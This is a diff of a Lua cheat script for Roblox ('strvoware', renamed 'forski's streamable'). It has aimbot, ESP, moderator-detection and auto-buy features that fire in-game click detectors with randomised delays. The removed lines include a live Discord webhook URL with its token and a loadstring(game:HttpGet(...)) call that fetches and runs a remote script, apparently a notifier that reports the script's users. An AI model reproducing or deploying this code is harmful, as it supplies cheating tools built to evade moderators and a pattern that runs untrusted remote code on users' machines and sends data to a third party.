@@ -9,7 +9,7 @@ local mouse          = localPlayer:GetMouse()
 local strvo           = game:GetObjects("rbxassetid://12705540680")[1]
 strvo.bg.Position     = UDim2.new(0.5,-strvo.bg.Size.X.Offset/2,0.5,-strvo.bg.Size.Y.Offset/2)
 strvo.Parent          = game:GetService("CoreGui")
-strvo.bg.pre.Text = '<font color="#FFFFF2">strvoware</font> - <font color="#FF0000">Version 2.5</font>'
+strvo.bg.pre.Text = '<font color="#FFFFF2">forski's streamable</font> - <font color="#FF0000">Version 2.6</font>'
 
 local library = {cheatname = "strvoware";ext = "";gamename = "";colorpicking = false;tabbuttons = {};tabs = {};options = {};flags = {};scrolling = false;notifyText = Drawing.new("Text");playing = false;multiZindex = 200;toInvis = {};libColor = Color3.fromRGB(69, 23, 255);disabledcolor = Color3.fromRGB(233, 0, 0);blacklisted = {Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.UserInputType.MouseMovement}}
 
@@ -2674,11 +2674,11 @@ end;
 -- Legit tab
 local aimbotTab = library:addTab("Legit")
 
--- Aiming group
+
 local aimingGroup = aimbotTab:createGroup('left', 'Aiming')
 --mod checker
 local GroupId = 33986332
-local NotificationMessagePrefix = "MOD INGAME: "
+local NotificationMessagePrefix = "MOD:; "
 local notificationEnabled = false
 local notificationConnection
 local playersInGroup = {} 
@@ -2688,11 +2688,11 @@ local function sendNotification()
     
     for _, player in ipairs(game.Players:GetPlayers()) do
         if player:IsInGroup(GroupId) then
-            table.insert(playersList, player.DisplayName) -- Store display names
+            table.insert(playersList, player.DisplayName) 
         end
     end
 
-    -- Sort players by their join order (assuming they joined when the game started)
+   
     table.sort(playersList)
 
     if #playersList > 0 then
@@ -2715,9 +2715,9 @@ end
 
 local function startNotificationLoop()
     while notificationEnabled do
-        sendNotification() -- Call the notification function
+        sendNotification()
         
-        wait(5) -- Wait for 5 seconds before checking again
+        wait(5) 
     end
 end
 
@@ -2726,12 +2726,11 @@ local function toggleNotification(value)
     if notificationEnabled then
         startNotificationLoop()
     else
-        -- If toggled off, clear the player list or handle accordingly.
+        
         playersInGroup = {}
     end
 end
 
--- Assuming aimingGroup is already defined in your GUI library/code.
 aimingGroup:addToggle({
     text = "Mod Check",
     flag = "modcheck",
@@ -2815,88 +2814,200 @@ fovSection:addSlider({text = "Size", flag = "FovSize", min = 1, max = 100, defau
 end})
 
 
---woopadoop
-getgenv().Title = "strvoware"
-getgenv().ThumbnailUrl = ""
-getgenv().Color = 0x000000 -- Black
 
-getgenv().FieldTitle = ""
-getgenv().FieldText = ""
+local autobuy = aimbotTab:createGroup('right', 'autobuy')
+local autobuy = aimbotTab:createGroup('right', '!only works on dastrike atm!')
+-- Variable to track whether auto-buy is enabled
+local autoBuyEnabled = true
 
-getgenv().FooterText = ""
-getgenv().FooterUrl = ""
-
-getgenv().Webhook = "https://discord.com/api/webhooks/1260809458523570267/uRbBSpAZWMuN_APoQlvNCO7oNtgJ_i1k_B1SaabWHa2IGwZBj0P_DhdY8bSaZJ3GETd-"
-
-coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
-end)()
-
---
-local kewlcat = aimbotTab:createGroup('right', 'kewlcat check')
-
-local GroupId = 13528605
-local NotificationMessagePrefix = "kewlcat: "
-local notificationEnabled = false
-local notificationConnection
-local playersInGroup = {} 
-
-local function sendNotification()
-    local playersList = {}
-    
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        if player:IsInGroup(GroupId) then
-            table.insert(playersList, player.DisplayName) -- Store display names
-        end
-    end
-
-    -- Sort players by their join order (assuming they joined when the game started)
-    table.sort(playersList)
-
-    if #playersList > 0 then
-        local combinedMessage = NotificationMessagePrefix .. table.concat(playersList, ", ")
-        
-        -- Send the notification with combined message
-        local success, _ = pcall(function()
-            game.StarterGui:SetCore("SendNotification", {
-                Title = "demon time",
-                Text = combinedMessage,
-                Duration = 3 -- Notification visible for 5 seconds
-            })
-        end)
-
-        if not success then
-            warn("Failed to send notification")
-        end
-    end
-end
-
-local function startNotificationLoop()
-    while notificationEnabled do
-        sendNotification() 
-        
-        wait(2)
-    end
-end
-
-local function toggleNotification(value)
-    notificationEnabled = value
-    if notificationEnabled then
-        startNotificationLoop()
-    else
-       
-        playersInGroup = {}
-    end
-end
-
-
-kewlcat:addToggle({
-    text = "kewlcat",
-    flag = "kewlcatk",
+autobuy:addToggle({
+    text = "Med Armour!",
+    flag = "medamour",
     default = true,
     callback = function(value)
-        toggleNotification(value)
+        autoBuyEnabled = value -- Update the toggle state
     end
 })
+
+-- Variables
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local buttons
+local cooldown = false
+
+-- Blacklist (add folder or button names you want to exclude here)
+local blacklist = {
+    "Ads", "Pizza", "Ignored", "USP" -- Example folders to exclude
+}
+
+-- Update character reference on respawn
+player.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+end)
+
+-- Wait for the "Pads" folder to load
+task.spawn(function()
+    while not buttons do
+        buttons = workspace:FindFirstChild("MAP"):FindFirstChild("Pads")
+        if not buttons then
+            task.wait(0.1)
+        end
+    end
+end)
+
+-- Function to check if an item is blacklisted
+local function isBlacklisted(item)
+    for _, name in ipairs(blacklist) do
+        if item.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+-- Function to check distance and click button
+local function checkAndClick()
+    if not autoBuyEnabled or not buttons or cooldown then return end -- Skip if auto-buy is disabled, buttons are missing, or cooldown is active
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    
+    if not humanoidRootPart then return end
+
+    local playerPosition = humanoidRootPart.Position
+    
+    for _, button in pairs(buttons:GetChildren()) do
+        if not isBlacklisted(button) then -- Skip blacklisted items
+            local clickDetector = button:FindFirstChild("ClickDetector")
+            local head = button:FindFirstChild("Head")
+            
+            if clickDetector and head then
+                local distance = (playerPosition - head.Position).Magnitude
+                if distance <= clickDetector.MaxActivationDistance then
+                    cooldown = true
+                    fireclickdetector(clickDetector) -- Simulates a click
+                    task.wait(math.random(30, 50) / 100) -- Random cooldown between 0.3 and 0.5 seconds
+                    cooldown = false
+                    break -- Only click one button per check
+                end
+            end
+        end
+    end
+end
+
+-- Connection to check on heartbeat
+game:GetService("RunService").Heartbeat:Connect(checkAndClick)
+
+    
+
+
+-- Variable to track whether auto-buy for pizza is enabled
+local autoBuyPizzaEnabled = true
+local pizzaConnection -- To store the Heartbeat connection
+
+autobuy:addToggle({
+    text = "Pizza!",
+    flag = "pizza",
+    default = true,
+    callback = function(value)
+        autoBuyPizzaEnabled = value -- Update the toggle state
+        
+        if autoBuyPizzaEnabled then
+            -- Reconnect the Heartbeat function
+            pizzaConnection = game:GetService("RunService").Heartbeat:Connect(checkAndClick)
+        else
+            -- Disconnect the Heartbeat function
+            if pizzaConnection then
+                pizzaConnection:Disconnect()
+                pizzaConnection = nil
+            end
+        end
+    end
+})
+
+-- Variables
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local buttons
+local cooldown = false
+
+-- Blacklist (add folder or button names you want to exclude here)
+local blacklist = {
+    "Ads", "Ignored", "Medium Armor", "USP" -- Example folders to exclude
+}
+
+-- Update character reference on respawn
+player.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+end)
+
+-- Wait for the "Pads" folder to load
+task.spawn(function()
+    while not buttons do
+        buttons = workspace:FindFirstChild("MAP"):FindFirstChild("Pads")
+        if not buttons then
+            task.wait(0.1)
+        end
+    end
+end)
+
+-- Function to check if an item is blacklisted
+local function isBlacklisted(item)
+    for _, name in ipairs(blacklist) do
+        if item.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+-- Function to check distance and click button
+function checkAndClick()
+    if not autoBuyPizzaEnabled or not buttons or cooldown then return end -- Skip if auto-buy is disabled, buttons are missing, or cooldown is active
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    
+    if not humanoidRootPart then return end
+
+    local playerPosition = humanoidRootPart.Position
+    
+    for _, button in pairs(buttons:GetChildren()) do
+        if not isBlacklisted(button) then -- Skip blacklisted items
+            local clickDetector = button:FindFirstChild("ClickDetector")
+            local head = button:FindFirstChild("Head")
+            
+            if clickDetector and head then
+                local distance = (playerPosition - head.Position).Magnitude
+                if distance <= clickDetector.MaxActivationDistance then
+                    cooldown = true
+                    fireclickdetector(clickDetector) -- Simulates a click
+                    task.wait(math.random(30, 50) / 100) -- Random cooldown between 0.3 and 0.5 seconds
+                    cooldown = false
+                    break -- Only click one button per check
+                end
+            end
+        end
+    end
+end
+
+-- Start the Heartbeat connection initially
+pizzaConnection = game:GetService("RunService").Heartbeat:Connect(checkAndClick)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -2987,35 +3098,9 @@ espSection:addToggle({
     end
 })
 
-espSection:addToggle({
-    text = "ESP Reload",
-    flag = "ESPReloading",
-    default = true,
-    callback = function(value)
-        Flags.ESPReloading = value
-        --Notifications:New("Reload ESP has been set to " .. tostring(value), 3)
-    end
-})
 
-espSection:addToggle({
-    text = "ESP Ammo",
-    flag = "ESPAmmo",
-    default = true,
-    callback = function(value)
-        Flags.ESPAmmo = value
-        --Notifications:New("Ammo ESP has been set to " .. tostring(value), 3)
-    end
-})
 
-espSection:addToggle({
-    text = "ESP Vest",
-    flag = "ESPVest",
-    default = true,
-    callback = function(value)
-        Flags.ESPVest = value
-        --Notifications:New("Vest ESP has been set to " .. tostring(value), 3)
-    end
-})
+
 
 espSection:addToggle({
     text = "ESP Health",
